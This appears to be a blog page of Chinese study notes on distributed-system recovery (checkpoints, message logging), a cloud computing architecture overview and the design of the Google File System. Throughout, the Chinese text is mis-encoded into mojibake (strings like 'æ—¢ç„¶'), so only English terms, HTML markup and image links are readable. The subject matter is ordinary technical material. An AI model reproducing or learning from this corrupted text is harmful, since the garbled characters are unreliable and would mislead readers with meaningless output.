<p>æ—¢ç„¶äº†è§£ä¸€ä¸‹ï¼Œé‚£æˆ‘å°±ç²˜ä¸€ä¸‹æåšå¼ºçš„ç¬”è®°ï¼Œæˆ‘ä¹Ÿä¸çœ‹äº†ã€‚</p>
<ol>
<li><p><strong>å›é€€å›å¤backward recovery</strong></p>
<p>å°†ç³»ç»Ÿä»å½“å‰çš„é”™è¯¯çŠ¶æ€å›åˆ°å…ˆå‰çš„æ­£ç¡®çŠ¶æ€ã€‚å¿…é¡»å®šæ—¶è®°å½•ç³»ç»Ÿçš„çŠ¶æ€(ç§° ä¸ºè®¾ç½®ä¸€ä¸ªè¿˜åŸç‚¹)</p>
</li>
<li><p><strong>å‰å‘æ¢å¤(forward recovery)</strong></p>
<p>å°è¯•ä»å¯ä»¥ç»§ç»­æ‰§è¡Œçš„æŸç‚¹å¼€å§‹æŠŠç³»ç»Ÿå¸¦å…¥ä¸€ä¸ªæ­£ç¡®çš„æ–°çŠ¶æ€ã€‚</p>
</li>
<li><p><strong>æ£€æŸ¥ç‚¹</strong></p>
<ol>
<li><p>Consistent Checkpointsæ£€æŸ¥ç‚¹ä¸€è‡´æ€§é—®é¢˜</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451828.png" alt="image-20190420221032131"></p>
<p>åˆ’recovery lineæ—¶ï¼Œå½“ä¸”ä»…å½“ç³»ç»Ÿæä¾›å¯é é€šä¿¡æ—¶ï¼ŒåŒä¸€ä¸ªçŠ¶æ€ä¸‹ï¼Œå‘é€çš„æ¶ˆæ¯å¿…é¡»å¾—è¢«æ¥æ”¶ã€‚(åœ¨å¯é é€šä¿¡ä¸‹ï¼ŒP1å‘é€äº†ä¸€ä¸ªæ¶ˆæ¯ï¼Œä½†æ˜¯P2æ²¡æ¥æ”¶ï¼Œè¿™å°±ä¼šå‡ºé—®é¢˜ï¼Œå¦‚ç¬¬äºŒæ¡recovery lineçš„åˆ’åˆ†)</p>
</li>
<li><p>ç¨³å®šå­˜å‚¨é—®é¢˜(è¿™ä¸ªæˆ‘å°±ä¸è®²äº†å•Šï¼Œå–å£æ°´)</p>
</li>
</ol>
</li>
<li><p>Message Loggingæ¶ˆæ¯æ—¥å¿—</p>
<ol>
<li>æ˜¯æ£€æŸ¥ç‚¹çš„å¦ä¸€ä¸ªæ€è·¯ï¼Œé€šè¿‡æ—¥å¿—è®°å½•æ¥è¿›è¡ŒæŸ¥é”™ã€‚</li>
<li>å°è¯•åœ¨æ—¥å¿—ä¸­è®°å½•å‘é€çš„æ¶ˆæ¯ï¼Œç„¶åå¯¹æ¶ˆæ¯è¿›ç¨‹é‡æ”¾ï¼Œæ¥æ›¿ä»£æ£€æŸ¥ç‚¹check point ã€‚</li>
</ol>
</li>
</ol>
<h1 id="äº‘è®¡ç®—-æ¦‚è¿°"><a href="#äº‘è®¡ç®—-æ¦‚è¿°" class="headerlink" title="äº‘è®¡ç®— - æ¦‚è¿°"></a>äº‘è®¡ç®— - æ¦‚è¿°</h1><h2 id="Googleæ–‡ä»¶ç³»ç»Ÿ-GFS"><a href="#Googleæ–‡ä»¶ç³»ç»Ÿ-GFS" class="headerlink" title="Googleæ–‡ä»¶ç³»ç»Ÿ(GFS)"></a>Googleæ–‡ä»¶ç³»ç»Ÿ(GFS)</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451829.png" alt="image-20190421105555424"></p>
<h2 id="äº‘è®¡ç®—æŠ€æœ¯ä½“ç³»ç»“æ„"><a href="#äº‘è®¡ç®—æŠ€æœ¯ä½“ç³»ç»“æ„" class="headerlink" title="äº‘è®¡ç®—æŠ€æœ¯ä½“ç³»ç»“æ„"></a>äº‘è®¡ç®—æŠ€æœ¯ä½“ç³»ç»“æ„</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451830.png" alt="image-20190421110140267"></p>
<p><strong>äº‘è®¡ç®—æŠ€æœ¯ä½“ç³»ç»“æ„åˆ†ä¸ºå››å±‚</strong></p>
<ul>
<li>ç‰©ç†èµ„æºå±‚</li>
<li>èµ„æºæ± å±‚</li>
<li>ç®¡ç†ä¸­é—´ä»¶å±‚</li>
<li>SOAï¼ˆService-Oriented Architectureï¼Œé¢å‘æœåŠ¡çš„ä½“ç³»ç»“æ„ï¼‰æ„å»ºå±‚</li>
</ul>
<h3 id="ç‰©ç†èµ„æºå±‚"><a href="#ç‰©ç†èµ„æºå±‚" class="headerlink" title="ç‰©ç†èµ„æºå±‚"></a>ç‰©ç†èµ„æºå±‚</h3><p>åŒ…æ‹¬è®¡ç®—æœºã€å­˜å‚¨å™¨ã€ç½‘ç»œè®¾æ–½ã€æ•°æ®åº“å’Œè½¯ä»¶ç­‰ã€‚</p>
<h3 id="èµ„æºæ± å±‚"><a href="#èµ„æºæ± å±‚" class="headerlink" title="èµ„æºæ± å±‚"></a>èµ„æºæ± å±‚</h3><p>å°†å¤§é‡<strong>ç›¸åŒç±»å‹</strong>çš„èµ„æºæ„æˆåŒæ„æˆ–æ¥è¿‘åŒæ„çš„èµ„æºæ± ï¼Œå¦‚è®¡ç®—èµ„æºæ± ã€æ•°æ®èµ„æºæ± ç­‰ã€‚æ„å»ºèµ„æºæ± æ›´å¤šçš„æ˜¯<strong>ç‰©ç†èµ„æºçš„é›†æˆå’Œç®¡ç†å·¥ä½œ</strong>ï¼Œä¾‹å¦‚ç ”ç©¶åœ¨ä¸€ä¸ªæ ‡å‡†é›†è£…ç®±çš„ç©ºé—´å¦‚ä½•è£…ä¸‹2000ä¸ªæœåŠ¡å™¨ã€è§£å†³æ•£çƒ­å’Œæ•…éšœèŠ‚ç‚¹æ›¿æ¢çš„é—®é¢˜å¹¶é™ä½èƒ½è€—ã€‚</p>
<h3 id="ç®¡ç†ä¸­é—´ä»¶å±‚"><a href="#ç®¡ç†ä¸­é—´ä»¶å±‚" class="headerlink" title="ç®¡ç†ä¸­é—´ä»¶å±‚"></a>ç®¡ç†ä¸­é—´ä»¶å±‚</h3><p>è´Ÿè´£å¯¹<strong>äº‘è®¡ç®—çš„èµ„æºè¿›è¡Œç®¡ç†</strong>ï¼Œå¹¶<strong>å¯¹ä¼—å¤šåº”ç”¨ä»»åŠ¡è¿›è¡Œè°ƒåº¦</strong>ï¼Œä½¿èµ„æºèƒ½å¤Ÿé«˜æ•ˆã€å®‰å…¨åœ°ä¸ºåº”ç”¨æä¾›æœåŠ¡ã€‚</p>
<h3 id="SOAæ„å»ºå±‚"><a href="#SOAæ„å»ºå±‚" class="headerlink" title="SOAæ„å»ºå±‚"></a>SOAæ„å»ºå±‚</h3><p>å°†äº‘è®¡ç®—èƒ½åŠ›<strong>å°è£…æˆæ ‡å‡†çš„Web ServicesæœåŠ¡</strong>ï¼Œå¹¶<strong>çº³å…¥SOAä½“ç³»è¿›è¡Œç®¡ç†å’Œä½¿ç”¨</strong>ï¼ŒåŒ…æ‹¬æœåŠ¡æ¥å£ã€æœåŠ¡æ³¨å†Œã€æœåŠ¡æŸ¥æ‰¾ã€æœåŠ¡è®¿é—®å’ŒæœåŠ¡å·¥ä½œæµç­‰ã€‚ç®¡ç†ä¸­é—´ä»¶å±‚å’Œèµ„æºæ± å±‚æ˜¯äº‘è®¡ç®—æŠ€æœ¯çš„æœ€å…³é”®éƒ¨åˆ†ï¼ŒSOAæ„å»ºå±‚çš„åŠŸèƒ½æ›´å¤šä¾é å¤–éƒ¨è®¾æ–½æä¾›ã€‚</p>
<h2 id="äº‘è®¡ç®—å®ç°æœºåˆ¶"><a href="#äº‘è®¡ç®—å®ç°æœºåˆ¶" class="headerlink" title="äº‘è®¡ç®—å®ç°æœºåˆ¶"></a>äº‘è®¡ç®—å®ç°æœºåˆ¶</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451831.png" alt="image-20190421110521483"></p>
<ul>
<li><p><strong>ç”¨æˆ·äº¤äº’æ¥å£</strong></p>
<p>å‘åº”ç”¨ä»¥Web Servicesæ–¹å¼æä¾›è®¿é—®æ¥å£ï¼Œè·å–ç”¨æˆ·éœ€æ±‚ã€‚</p>
</li>
<li><p><strong>æœåŠ¡ç›®å½•</strong></p>
<p>ç”¨æˆ·å¯ä»¥è®¿é—®çš„æœåŠ¡æ¸…å•ã€‚</p>
</li>
<li><p><strong>ç³»ç»Ÿç®¡ç†æ¨¡å—</strong></p>
<p>è´Ÿè´£ç®¡ç†å’Œåˆ†é…æ‰€æœ‰å¯ç”¨çš„èµ„æºï¼Œå…¶æ ¸å¿ƒæ˜¯<strong>è´Ÿè½½å‡è¡¡</strong>ã€‚</p>
</li>
<li><p><strong>é…ç½®å·¥å…·</strong></p>
<p>è´Ÿè´£åœ¨åˆ†é…çš„èŠ‚ç‚¹ä¸Š<strong>å‡†å¤‡ä»»åŠ¡è¿è¡Œç¯å¢ƒ</strong>ã€‚</p>
</li>
<li><p><strong>ç›‘è§†ç»Ÿè®¡æ¨¡å—</strong></p>
<p>è´Ÿè´£ç›‘è§†èŠ‚ç‚¹çš„è¿è¡ŒçŠ¶æ€ï¼Œå¹¶å®Œæˆç”¨æˆ·ä½¿ç”¨èŠ‚ç‚¹æƒ…å†µçš„ç»Ÿè®¡ã€‚</p>
</li>
</ul>
<p><strong>æ‰§è¡Œè¿‡ç¨‹</strong></p>
<p>ç”¨æˆ·äº¤äº’æ¥å£å…è®¸ç”¨æˆ·ä»ç›®å½•ä¸­é€‰å–å¹¶è°ƒç”¨ä¸€ä¸ªæœåŠ¡ï¼Œè¯¥è¯·æ±‚ä¼ é€’ç»™ç³»ç»Ÿç®¡ç†æ¨¡å—åï¼Œå®ƒå°†ä¸ºç”¨æˆ·åˆ†é…æ°å½“çš„èµ„æºï¼Œç„¶åè°ƒç”¨é…ç½®å·¥å…·ä¸ºç”¨æˆ·å‡†å¤‡è¿è¡Œç¯å¢ƒã€‚</p>
<h2 id="äº‘è®¡ç®—çš„ç‰¹ç‚¹"><a href="#äº‘è®¡ç®—çš„ç‰¹ç‚¹" class="headerlink" title="äº‘è®¡ç®—çš„ç‰¹ç‚¹"></a>äº‘è®¡ç®—çš„ç‰¹ç‚¹</h2><ul>
<li>è¶…å¤§è§„æ¨¡</li>
<li>é«˜å¯æ‰©å±•æ€§</li>
<li>è™šæ‹ŸåŒ–</li>
<li>æŒ‰éœ€æœåŠ¡</li>
<li>é«˜å¯é æ€§</li>
<li>æå…¶å»‰ä»·</li>
<li>é€šç”¨æ€§</li>
</ul>
<h1 id="äº‘è®¡ç®—-GFS"><a href="#äº‘è®¡ç®—-GFS" class="headerlink" title="äº‘è®¡ç®— - GFS"></a>äº‘è®¡ç®— - GFS</h1><h2 id="ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—"><a href="#ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—" class="headerlink" title="ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—"></a>ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—</h2><h3 id="ç½‘æ ¼è®¡ç®—"><a href="#ç½‘æ ¼è®¡ç®—" class="headerlink" title="ç½‘æ ¼è®¡ç®—"></a>ç½‘æ ¼è®¡ç®—</h3><ul>
<li>åœ¨åŠ¨æ€å˜åŒ–ã€ç”±å¤šä¸ªæœºæ„ç»„æˆçš„è™šæ‹Ÿç»„ç»‡ä¸­åè°ƒèµ„æºå…±äº«å’Œæ±‚è§£é—®é¢˜</li>
<li>å®ç°è·¨ç»„ç»‡è·¨å¹³å°å¼‚æ„èµ„æºçš„å…±äº«</li>
</ul>
<h3 id="äº‘è®¡ç®—"><a href="#äº‘è®¡ç®—" class="headerlink" title="äº‘è®¡ç®—"></a>äº‘è®¡ç®—</h3><ul>
<li>ä¸€ç§<strong>å•†ä¸š</strong>è®¡ç®—æ¨¡å‹ã€‚</li>
<li>å°†è®¡ç®—ä»»åŠ¡åˆ†å¸ƒåœ¨å¤§é‡è®¡ç®—æœºæ„æˆçš„èµ„æºæ± ä¸Šï¼Œä½¿å„ç§åº”ç”¨ç³»ç»Ÿ(ç”¨æˆ·)èƒ½å¤Ÿæ ¹æ®éœ€è¦è·å–è®¡ç®—åŠ›ã€å­˜å‚¨ç©ºé—´å’Œä¿¡æ¯æœåŠ¡ã€‚</li>
</ul>
<h3 id="ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—çš„æ¯”è¾ƒ"><a href="#ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—çš„æ¯”è¾ƒ" class="headerlink" title="ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—çš„æ¯”è¾ƒ"></a>ç½‘æ ¼è®¡ç®—ä¸äº‘è®¡ç®—çš„æ¯”è¾ƒ</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451832.png" alt="image-20190421114530658"></p>
<h2 id="äº‘è®¡ç®—çš„åˆ†ç±»"><a href="#äº‘è®¡ç®—çš„åˆ†ç±»" class="headerlink" title="äº‘è®¡ç®—çš„åˆ†ç±»"></a>äº‘è®¡ç®—çš„åˆ†ç±»</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451833.png" alt="image-20190421115236700"></p>
<h2 id="äº‘è®¡ç®—ä¸æ˜¯å·¨å‹æœºæ¨¡å¼çš„ç®€å•å›å½’"><a href="#äº‘è®¡ç®—ä¸æ˜¯å·¨å‹æœºæ¨¡å¼çš„ç®€å•å›å½’" class="headerlink" title="äº‘è®¡ç®—ä¸æ˜¯å·¨å‹æœºæ¨¡å¼çš„ç®€å•å›å½’"></a>äº‘è®¡ç®—ä¸æ˜¯å·¨å‹æœºæ¨¡å¼çš„ç®€å•å›å½’</h2><p>äº‘è®¡ç®—çš„æœ¬è´¨æ˜¯åˆ†å¸ƒå¼è®¡ç®—ï¼Œä½†æœ‰é›†ä¸­ç®¡ç†æŸäº›ç‰¹å¾ä¼˜ç‚¹:</p>
<ul>
<li><p>æ›´å¥½çš„æ€§èƒ½ä»·æ ¼æ¯”ï¼›</p>
</li>
<li><p>å¤šæ•°åº”ç”¨æ˜¯åˆ†å¸ƒå¼çš„ï¼›</p>
</li>
<li><p>é«˜å¯é æ€§</p>
<p>ç°ä»£åˆ†å¸ƒå¼ç³»ç»Ÿå…·æœ‰é«˜åº¦å®¹é”™æœºåˆ¶ï¼›</p>
</li>
<li><p>å¯æ‰©å±•æ€§</p>
<p>ä¹°ä¸€å°æ€§èƒ½æ›´é«˜çš„å¤§å‹æœºï¼Œæˆ–è€…å†ä¹°ä¸€å°æ€§èƒ½ç›¸åŒçš„å¤§å‹æœºçš„è´¹ç”¨éƒ½æ¯”æ·»åŠ å‡ å°PCçš„è´¹ç”¨é«˜å¾—å¤šï¼›</p>
</li>
<li><p>é«˜åº¦çµæ´»æ€§ï¼šèƒ½å¤Ÿå…¼å®¹ä¸åŒç¡¬ä»¶å‚å•†çš„äº§å“ï¼Œå…¼å®¹ä½é…ç½®æœºå™¨å’Œå¤–è®¾è€Œè·å¾—é«˜æ€§èƒ½è®¡ç®—ã€‚</p>
</li>
</ul>
<h2 id="Googleäº‘è®¡ç®—å¹³å°æŠ€æœ¯æ¶æ„"><a href="#Googleäº‘è®¡ç®—å¹³å°æŠ€æœ¯æ¶æ„" class="headerlink" title="Googleäº‘è®¡ç®—å¹³å°æŠ€æœ¯æ¶æ„"></a>Googleäº‘è®¡ç®—å¹³å°æŠ€æœ¯æ¶æ„</h2><ul>
<li><p>æ–‡ä»¶å­˜å‚¨</p>
<p>Google Distributed File Systemï¼ŒGFS</p>
</li>
<li><p>å¹¶è¡Œæ•°æ®å¤„ç†</p>
<p>MapReduce</p>
</li>
<li><p>åˆ†å¸ƒå¼é”</p>
<p>Chubby</p>
</li>
<li><p>ç»“æ„åŒ–æ•°æ®è¡¨</p>
<p>BigTable</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451834.png" alt="image-20190421115533396"></p>
<h2 id="æ–‡ä»¶ç³»ç»ŸåŸºç¡€"><a href="#æ–‡ä»¶ç³»ç»ŸåŸºç¡€" class="headerlink" title="æ–‡ä»¶ç³»ç»ŸåŸºç¡€"></a>æ–‡ä»¶ç³»ç»ŸåŸºç¡€</h2><p><strong>ä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ</strong>?</p>
<ul>
<li>FAT, FAT32, NTFS, EXT, â€¦â€¦</li>
<li>ç”¨äºæŒä¹…åœ°å­˜å‚¨æ•°æ®çš„ç³»ç»Ÿï¼Œé€šå¸¸è¦†ç›–åœ¨åº•å±‚çš„ç‰©ç†å­˜å‚¨ä»‹è´¨ä¸Šï¼Œå¦‚ï¼šç¡¬ç›˜ã€CDã€ç£å¸¦ç­‰</li>
</ul>
<p><strong>æ•°æ®ç»„ç»‡çš„åŸºæœ¬å•å…ƒ</strong></p>
<p><strong>æ–‡ä»¶</strong></p>
<ul>
<li>å…·æœ‰æ–‡ä»¶å(1.txt)</li>
<li>é€šå¸¸æ”¯æŒå±‚æ¬¡åŒ–åµŒå¥—(ç›®å½•ç»“æ„)</li>
</ul>
<p><strong>æ–‡ä»¶è·¯å¾„</strong></p>
<ul>
<li>æ–‡ä»¶ä¸ç›®å½•çš„ç»“åˆï¼Œç”¨äºå®šä½æ–‡ä»¶</li>
<li>ç»å¯¹è·¯å¾„ï¼Œ&#x2F;home&#x2F;aaron&#x2F;foo.txt</li>
<li>ç›¸å¯¹è·¯å¾„ï¼Œdocs&#x2F;someFile.doc</li>
</ul>
<p><strong>è§„èŒƒè·¯å¾„</strong></p>
<ul>
<li>å®šä½æ–‡ä»¶çš„æœ€çŸ­ç»å¯¹è·¯å¾„</li>
<li>&#x2F;home&#x2F;aaron&#x2F;foo.txt, &#x2F;home&#x2F;..&#x2F;home&#x2F;aaron&#x2F;.&#x2F;foo.txt</li>
<li>æ‰€æœ‰è§„èŒƒè·¯å¾„çš„é›†åˆæ„æˆäº†æ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ç»“æ„</li>
</ul>
<p><strong>æ–‡ä»¶ç³»ç»Ÿçš„å­˜å‚¨å†…å®¹</strong></p>
<ul>
<li>ä¸»è¦å†…å®¹ï¼šç”¨æˆ·çš„å®é™…æ•°æ®</li>
<li><strong>å…ƒæ•°æ®</strong>ï¼šé©±åŠ¨å™¨å…ƒæ•°æ®ä¸æ–‡ä»¶å…ƒæ•°æ®</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451835.png" alt="image-20190421134431288"></p>
<p>æ–‡ä»¶ç³»ç»Ÿè®¾è®¡çš„è€ƒè™‘å› ç´ </p>
<ul>
<li>æœ€å°å­˜å‚¨å•å…ƒ<ul>
<li>è¾ƒå°å¯å‡å°‘æµªè´¹ç©ºé—´ï¼Œè¾ƒå¤§åˆ™å¯æé«˜æ–‡ä»¶é¡ºåºè¯»å–é€Ÿåº¦</li>
</ul>
</li>
<li>æ–‡ä»¶ç³»ç»Ÿçš„è®¾è®¡ç›®æ ‡æ˜¯æé«˜è®¿é—®é€Ÿåº¦è¿˜æ˜¯æé«˜ä½¿ç”¨ç‡?</li>
</ul>
<p>æ–‡ä»¶ç³»ç»Ÿçš„å®‰å…¨æ€§</p>
<ul>
<li>å¤šç”¨æˆ·ç¯å¢ƒä¸‹çš„æ–‡ä»¶å®‰å…¨</li>
<li>è¯»&#x2F;å†™æƒé™åˆ†é…</li>
<li>æ–‡ä»¶é™„å¸¦è®¿é—®æ§åˆ¶åˆ—è¡¨(ACL)</li>
</ul>
<p>æ–‡ä»¶ç³»ç»Ÿç¼“å­˜</p>
<ul>
<li><strong>æé«˜æ–‡ä»¶ç³»ç»Ÿè¯»å†™æ•ˆç‡</strong></li>
</ul>
<h2 id="GFSçš„å‡è®¾ä¸ç›®æ ‡"><a href="#GFSçš„å‡è®¾ä¸ç›®æ ‡" class="headerlink" title="GFSçš„å‡è®¾ä¸ç›®æ ‡"></a>GFSçš„å‡è®¾ä¸ç›®æ ‡</h2><p>ç¡¬ä»¶å‡ºé”™æ˜¯æ­£å¸¸è€Œéå¼‚å¸¸</p>
<ul>
<li>ç³»ç»Ÿåº”å½“ç”±å¤§é‡å»‰ä»·ã€æ˜“æŸçš„ç¡¬ä»¶ç»„æˆ</li>
<li>å¿…é¡»ä¿æŒæ–‡ä»¶ç³»ç»Ÿæ•´ä½“çš„å¯é æ€§</li>
</ul>
<p>ä¸»è¦è´Ÿè½½æ˜¯æµæ•°æ®è¯»å†™</p>
<ul>
<li>ä¸»è¦ç”¨äºç¨‹åºå¤„ç†æ‰¹é‡æ•°æ®ï¼Œè€Œéä¸ç”¨æˆ·çš„äº¤äº’æˆ–éšæœºè¯»å†™</li>
<li>æ•°æ®å†™ä¸»è¦æ˜¯â€œè¿½åŠ å†™â€ï¼Œâ€œæ’å…¥å†™â€éå¸¸å°‘</li>
</ul>
<p>éœ€è¦å­˜å‚¨å¤§å°ºå¯¸çš„æ–‡ä»¶</p>
<ul>
<li>å­˜å‚¨çš„æ–‡ä»¶å°ºå¯¸å¯èƒ½æ˜¯GBæˆ–TBé‡çº§ï¼Œè€Œä¸”åº”å½“èƒ½æ”¯æŒå­˜å‚¨æˆåƒä¸Šä¸‡çš„å¤§å°ºå¯¸æ–‡ä»¶</li>
</ul>
<h2 id="GFSçš„è®¾è®¡æ€è·¯"><a href="#GFSçš„è®¾è®¡æ€è·¯" class="headerlink" title="GFSçš„è®¾è®¡æ€è·¯"></a>GFSçš„è®¾è®¡æ€è·¯</h2><p>å°†æ–‡ä»¶åˆ’åˆ†ä¸ºè‹¥å¹²å—(Chunk)å­˜å‚¨</p>
<ul>
<li>æ¯ä¸ªå—å›ºå®šå¤§å°(64M)</li>
</ul>
<p>é€šè¿‡å†—ä½™æ¥æé«˜å¯é æ€§</p>
<ul>
<li>æ¯ä¸ªæ•°æ®å—è‡³å°‘åœ¨3ä¸ªæ•°æ®å—æœåŠ¡å™¨ä¸Šå†—ä½™</li>
</ul>
<p>é€šè¿‡å•ä¸ªmasteræ¥åè°ƒæ•°æ®è®¿é—®ã€å…ƒæ•°æ®å­˜å‚¨</p>
<ul>
<li>ç»“æ„ç®€å•ï¼Œå®¹æ˜“ä¿æŒå…ƒæ•°æ®ä¸€è‡´æ€§</li>
</ul>
<p>æ— ç¼“å­˜</p>
<h2 id="GFSæ¶æ„"><a href="#GFSæ¶æ„" class="headerlink" title="GFSæ¶æ„"></a>GFSæ¶æ„</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451836.png" alt="image-20190421135452827"></p>
<h3 id="å•ä¸€Masteré—®é¢˜"><a href="#å•ä¸€Masteré—®é¢˜" class="headerlink" title="å•ä¸€Masteré—®é¢˜"></a>å•ä¸€Masteré—®é¢˜</h3><p>åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡å‘Šè¯‰æˆ‘ä»¬</p>
<ul>
<li>è¿™æ˜¯å•ç‚¹æ•…éšœ</li>
<li>è¿™æ˜¯æ€§èƒ½ç“¶é¢ˆ</li>
</ul>
<h3 id="å•ç‚¹æ•…éšœé—®é¢˜"><a href="#å•ç‚¹æ•…éšœé—®é¢˜" class="headerlink" title="å•ç‚¹æ•…éšœé—®é¢˜"></a>å•ç‚¹æ•…éšœé—®é¢˜</h3><p>é‡‡ç”¨å¤šä¸ª(å¦‚3ä¸ª)å½±å­MasterèŠ‚ç‚¹è¿›è¡Œçƒ­å¤‡ï¼Œä¸€æ—¦ä¸»èŠ‚ç‚¹æŸåï¼Œç«‹åˆ»é€‰ä¸¾ä¸€ä¸ªæ–°çš„ä¸»èŠ‚ç‚¹æœåŠ¡</p>
<p>çœŸå®æ•°æ®æ”¾åœ¨ chunk server ä¸Šï¼Œmetadataæ”¾åœ¨MasterèŠ‚ç‚¹ä¸Šã€‚ç”¨æˆ·è®¿é—®æ—¶è®¿é—®çš„æ˜¯metadataï¼ˆç±»ä¼¼äºç´¢å¼•ï¼‰ã€‚</p>
<h3 id="æ€§èƒ½ç“¶é¢ˆé—®é¢˜"><a href="#æ€§èƒ½ç“¶é¢ˆé—®é¢˜" class="headerlink" title="æ€§èƒ½ç“¶é¢ˆé—®é¢˜"></a>æ€§èƒ½ç“¶é¢ˆé—®é¢˜</h3><p>å°½å¯èƒ½å‡å°‘æ•°æ®å­˜å–ä¸­Masterçš„å‚ä¸ç¨‹åº¦</p>
<ol>
<li>ä¸ä½¿ç”¨Masterè¯»å–æ•°æ®ï¼Œä»…ç”¨äºä¿å­˜å…ƒæ•°æ®ã€‚</li>
<li>å®¢æˆ·ç«¯ç¼“å­˜å…ƒæ•°æ®</li>
<li>é‡‡ç”¨å¤§å°ºå¯¸çš„æ•°æ®å—(64M)</li>
<li>æ•°æ®ä¿®æ”¹é¡ºåºäº¤ç”±Primary Chunk Serverå®Œæˆ</li>
</ol>
<h3 id="MasterèŠ‚ç‚¹çš„ä»»åŠ¡"><a href="#MasterèŠ‚ç‚¹çš„ä»»åŠ¡" class="headerlink" title="MasterèŠ‚ç‚¹çš„ä»»åŠ¡"></a>MasterèŠ‚ç‚¹çš„ä»»åŠ¡</h3><ul>
<li>å­˜å‚¨å…ƒæ•°æ®</li>
<li>æ–‡ä»¶ç³»ç»Ÿç›®å½•ç®¡ç†ä¸åŠ é”</li>
<li>ä¸ChunkServerè¿›è¡Œå‘¨æœŸæ€§é€šä¿¡<ul>
<li>å‘é€æŒ‡ä»¤ï¼Œæœé›†çŠ¶æ€ï¼Œè·Ÿè¸ªæ•°æ®å—çš„å®Œå¥½æ€§</li>
</ul>
</li>
<li>æ•°æ®å—åˆ›å»ºã€å¤åˆ¶åŠè´Ÿè½½å‡è¡¡<ul>
<li>å¯¹ChunkServerçš„ç©ºé—´ä½¿ç”¨å’Œè®¿é—®é€Ÿåº¦è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼Œå¹³æ»‘æ•°æ®å­˜å‚¨å’Œè®¿é—®è¯·æ±‚çš„è´Ÿè½½</li>
<li>å¯¹æ•°æ®å—è¿›è¡Œå¤åˆ¶ã€åˆ†æ•£åˆ°ChunkServerä¸Š</li>
<li>ä¸€æ—¦æ•°æ®å—å†—ä½™æ•°å°äºæœ€ä½æ•°ï¼Œå°±å‘èµ·å¤åˆ¶æ“ä½œ</li>
</ul>
</li>
<li>åƒåœ¾å›æ”¶<ul>
<li>åœ¨æ—¥å¿—ä¸­<strong>è®°å½•</strong>åˆ é™¤æ“ä½œï¼Œå¹¶å°†æ–‡ä»¶æ”¹åéšè—</li>
<li>ç¼“æ…¢åœ°å›æ”¶éšè—æ–‡ä»¶</li>
<li>ä¸ä¼ ç»Ÿæ–‡ä»¶åˆ é™¤ç›¸æ¯”æ›´ç®€å•ã€æ›´å®‰å…¨</li>
</ul>
</li>
<li>é™ˆæ—§æ•°æ®å—åˆ é™¤<ul>
<li><strong>æ¢æµ‹é™ˆæ—§çš„æ•°æ®å—</strong>ï¼Œå¹¶åˆ é™¤</li>
</ul>
</li>
</ul>
<h3 id="GFSæ¶æ„çš„ç‰¹ç‚¹"><a href="#GFSæ¶æ„çš„ç‰¹ç‚¹" class="headerlink" title="GFSæ¶æ„çš„ç‰¹ç‚¹"></a>GFSæ¶æ„çš„ç‰¹ç‚¹</h3><p>é‡‡ç”¨ä¸­å¿ƒæœåŠ¡å™¨æ¨¡å¼</p>
<ul>
<li>å¯ä»¥æ–¹ä¾¿åœ°å¢åŠ Chunk Server</li>
<li>MasteræŒæ¡ç³»ç»Ÿå†…æ‰€æœ‰Chunk Serverçš„æƒ…å†µï¼Œæ–¹ä¾¿è¿›è¡Œè´Ÿè½½å‡è¡¡</li>
<li>ä¸å­˜åœ¨å…ƒæ•°æ®çš„ä¸€è‡´æ€§é—®é¢˜</li>
<li>ä¸ç¼“å­˜æ•°æ®<ul>
<li>GFSçš„æ–‡ä»¶æ“ä½œå¤§éƒ¨åˆ†æ˜¯æµå¼è¯»å†™ï¼Œä¸å­˜åœ¨å¤§é‡çš„é‡å¤è¯»å†™ï¼Œä½¿ç”¨Cacheå¯¹æ€§èƒ½æé«˜ä¸å¤§</li>
<li>Chunk Serverä¸Šçš„æ•°æ®å­˜å–ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚æœæŸä¸ªChunkè¯»å–é¢‘ç¹ï¼Œæ–‡ä»¶ç³»ç»Ÿå…·æœ‰Cache</li>
<li>ä»å¯è¡Œæ€§çœ‹ï¼ŒCacheä¸å®é™…æ•°æ®çš„ä¸€è‡´æ€§ç»´æŠ¤ä¹Ÿæå…¶å¤æ‚</li>
</ul>
</li>
<li>åœ¨ç”¨æˆ·æ€ä¸‹å®ç°<ul>
<li>ç›´æ¥åˆ©ç”¨Chunk Serverçš„æ–‡ä»¶ç³»ç»Ÿå­˜å–Chunkï¼Œå®ç°ç®€å•</li>
<li>ç”¨æˆ·æ€åº”ç”¨è°ƒè¯•è¾ƒä¸ºç®€å•ï¼Œåˆ©äºå¼€å‘</li>
<li>ç”¨æˆ·æ€çš„GFSä¸ä¼šå½±å“Chunk Serverçš„ç¨³å®šæ€§</li>
</ul>
</li>
<li>æä¾›ä¸“ç”¨çš„è®¿é—®æ¥å£<ul>
<li>æœªæä¾›æ ‡å‡†çš„POSIXè®¿é—®æ¥å£</li>
<li>é™ä½GFSçš„å®ç°å¤æ‚åº¦</li>
</ul>
</li>
</ul>
